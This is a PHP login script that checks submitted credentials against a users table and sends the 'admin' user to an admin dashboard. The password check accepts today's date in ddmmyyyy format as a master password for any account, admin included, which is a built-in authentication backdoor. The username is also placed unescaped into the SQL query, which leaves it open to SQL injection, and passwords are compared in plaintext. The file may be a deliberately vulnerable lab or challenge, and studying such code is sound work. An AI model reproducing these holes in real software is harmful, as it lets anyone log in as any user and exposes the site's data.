<?php
session_start();

include 'config.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Query the database to check if the user exists
    $sql = "SELECT * FROM users WHERE name = '$username'";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $stored_password = $row['password'];

        // Check if the entered password matches the stored password or today's date in ddmmyyyy format
        if ($password == $stored_password || $password == date('dmY')) {
            // Password or today's date matches, login successful
            $_SESSION['username'] = $username;

            // Check if the user is an admin
            if ($username == 'admin') {
                header("Location: admin_dashboard.php");
            } else {
                header("Location: user_dashboard.php");
            }
            exit();
        } else {
            // Incorrect password
            $_SESSION['error'] = "Incorrect password.";
            header("Location: index.php");
            exit();
        }
    } else {
        // User does not exist
        $_SESSION['error'] = "User does not exist.";
        header("Location: index.php");
        exit();
    }
}

$conn->close();
